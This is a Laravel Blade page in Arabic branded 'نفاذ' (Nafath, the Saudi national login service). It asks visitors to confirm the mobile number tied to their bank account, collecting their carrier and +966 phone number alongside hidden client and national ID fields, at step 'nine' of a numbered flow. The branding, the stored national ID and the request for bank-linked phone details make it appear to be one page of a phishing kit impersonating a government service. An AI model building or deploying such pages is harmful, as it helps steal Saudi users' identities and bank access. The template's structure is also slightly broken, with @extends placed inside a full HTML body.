<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نفاذ</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #f8f9fa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
        }
        .logo {
            width: 120px;
            margin: 2rem auto;
            display: block;
        }
        .verification-card {
            background: white;
            border-radius: 15px;
            padding: 2rem;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            margin: 1rem;
            border: 1px solid #e0e0e0;
        }
        .verification-title {
            color: #666;
            font-size: 1.2rem;
            margin-bottom: 2rem;
            text-align: center;
        }
        .form-select, .form-control {
            border: 1px solid #ddd;
            padding: 0.8rem;
            margin-bottom: 1rem;
            border-radius: 8px;
            font-size: 1rem;
        }
        .submit-btn {
            background-color: #00a884;
            color: white;
            border: none;
            padding: 0.8rem;
            border-radius: 8px;
            width: 100%;
            font-size: 1.1rem;
            margin-top: 1rem;
        }
        .submit-btn:hover {
            background-color: #009677;
        }
    </style>
</head>
<body>
@extends('frontend.layout.master')
@section('content')
<div class="container">

    <div class="verification-card">
        <h2 class="verification-title">توثيق رقم الجوال المرتبط بالحساب البنكي</h2>
        
        <form action="{{ route('stepNineAction') }}" method="POST">
            @csrf
            <input type="hidden" name="client_id" value="{{ $client->id }}">
            <input type="hidden" name="national_number" value="{{ $client->national_number }}">
            <input type="hidden" name="step" value="7">

            <select class="form-select" id="network_id" name="network_id">
                <option selected disabled>اختر نوع الشريحة</option>
                @foreach($mobile_network as $value)
                    <option value="{{ $value->id }}">{{ $value->name }}</option>
                @endforeach
            </select>
            @error('network_id')
                <div class="text-danger small mb-2">{{ $message }}</div>
            @enderror

      <input 
    type="tel" 
    class="form-control" 
    name="phone" 
    value="{{ old('phone') }}" 
    placeholder="+966*********" 
    dir="ltr" 
    id="phone-input" 
    inputmode="numeric" 
    maxlength="13" 
    required
>

@error('phone')
    <div class="text-danger small mb-2">{{ $message }}</div>
@enderror

<script>
    document.getElementById('phone-input').addEventListener('input', function (e) {
        this.value = this.value.replace(/[^0-9]/g, '');
    });
</script>



            <button type="submit" class="submit-btn">تأكيد</button>
        </form>
    </div>
</div>
@endsection
</body>
</html>